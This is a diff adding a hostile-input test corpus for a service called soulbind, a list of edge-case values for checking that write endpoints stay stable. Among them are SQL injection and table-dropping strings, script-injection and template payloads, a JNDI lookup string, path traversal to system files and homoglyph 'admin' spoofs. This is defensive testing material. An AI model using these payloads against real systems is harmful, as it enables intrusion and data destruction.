@@ -1,0 +1,113 @@
+# soulbind hostile-input corpus, v1.
+#
+# One value per line. '#' begins a comment; blank lines ignored.
+# \uXXXX escapes are unescaped by the consumer.
+#
+# Every value here should be safe to send to any write endpoint. The oracle is
+# never "this is rejected" -- it is "no 5xx, a well-formed envelope, and the
+# server is alive afterwards". Some of these are perfectly legal inputs.
+
+# --- empty and whitespace ------------------------------------------------
+\u0020
+\u0009
+\u000B
+
+# --- boundary lengths ----------------------------------------------------
+a
+aa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+# --- type confusion: values that look like other types -------------------
+0
+-1
+1e309
+NaN
+Infinity
+true
+false
+null
+undefined
+[]
+{}
+[object Object]
+
+# --- numeric edges -------------------------------------------------------
+2147483647
+2147483648
+-2147483648
+9223372036854775807
+9223372036854775808
+0x7fffffff
+007
+
+# --- identifier shapes that are not identifiers --------------------------
+00000000-0000-0000-0000-000000000000
+not-a-uuid
+../../etc/passwd
+..\\..\\windows\\system32
+/absolute/path
+C:\\Windows
+
+# --- SQL-hostile ---------------------------------------------------------
+' OR '1'='1
+'; DROP TABLE identity; --
+\u0027 UNION SELECT NULL --
+%27%20OR%201=1
+
+# --- markup and template-hostile -----------------------------------------
+<script>alert(1)</script>
+</textarea><svg onload=alert(1)>
+{{7*7}}
+${jndi:ldap://example.invalid/a}
+&lt;b&gt;not bold&lt;/b&gt;
+
+# --- control and format characters ---------------------------------------
+\u0000
+\u0007
+\u001B[31mred\u001B[0m
+\u007F
+\uFEFF
+
+# --- zero-width and invisible --------------------------------------------
+\u200B
+\u200C
+\u200D
+a\u200Bb
+
+# --- bidirectional text (a rendering hazard, not just an encoding one) ---
+\u202Etxet desrever
+\u202Aleft-to-right\u202C
+\u2066first\u2069
+
+# --- astral plane: four-byte UTF-8, the classic latin1 tripwire ----------
+\uD83D\uDE00
+\uD83E\uDD16
+\uD83C\uDDEC\uD83C\uDDE7
+\uD800\uDC00
+
+# --- combining marks and normalisation -----------------------------------
+e\u0301
+\u00E9
+A\u030A
+\uFB01
+
+# --- homoglyphs: visually identical, different codepoints ---------------
+\u0430dmin
+\u217Fadmin
+ADMIN
+admin
+
+# --- case and separator handling in the link-code alphabet --------------
+abcd-efgh
+ABCD EFGH
+abcdefgh
+a-b-c-d-e-f-g-h
+0OIl1
+
+# --- names that are legal but awkward ------------------------------------
+\u4E2D\u6587\u7528\u6237
+\u0645\u0633\u062A\u062E\u062F\u0645
+\u0418\u0432\u0430\u043D
+O'Brien
+van der Berg
